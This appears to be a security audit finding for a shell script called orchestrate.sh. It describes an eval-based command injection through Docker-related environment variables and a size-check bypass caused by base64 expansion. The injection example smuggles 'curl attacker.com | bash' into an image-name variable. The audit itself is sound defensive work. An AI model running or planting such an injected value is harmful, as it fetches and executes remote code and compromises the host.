================================================================================
CRITICAL VULNERABILITY #1: Environment Variable Command Injection
================================================================================

Severity:    🔴 CRITICAL (CVSS 9.8)
Type:        Command Injection via eval
Location:    orchestrate.sh:530
Risk:        Remote Code Execution

Vulnerable Parameters:
  - CFN_DOCKER_IMAGE (Line 527)
  - CFN_MEMORY_LIMIT (Line 508)
  - CFN_DOCKER_NETWORK (Line 510)

Attack Vector:
  export CFN_DOCKER_IMAGE='ubuntu:latest"; curl attacker.com | bash; echo "'
  ./orchestrate.sh --task-id task1 --loop3-agents backend

Result:
  ✗ docker run --detach "ubuntu:latest"; curl attacker.com | bash; echo ""
  ✗ All three commands execute via eval

Root Cause:
  eval "$DOCKER_CMD" processes variable expansion + shell metacharacters
  Quotes in string don't protect against semicolons in variable values

Impact:
  - Full system compromise if orchestrate.sh runs with untrusted env
  - Container escape to host system
  - Data exfiltration, malware installation

CRITICAL VULNERABILITY #2: Base64 DoS Bypass
================================================================================

Severity:    🔴 CRITICAL (CVSS 8.6)
Type:        Denial of Service / Size Check Bypass
Location:    orchestrate.sh:458-465, 517-521
Risk:        Resource Exhaustion

Vulnerability:
  Size validation occurs BEFORE base64 encoding:
  - JSON input: 10,485,760 bytes (exactly at limit) - PASS
  - Base64 output: 13,981,016 bytes (+33% expansion) - BYPASS
  - Docker env var: 13.9MB string
  - Agent container: Memory exhaustion/OOM

The fix is bypassed by encoding expansion.
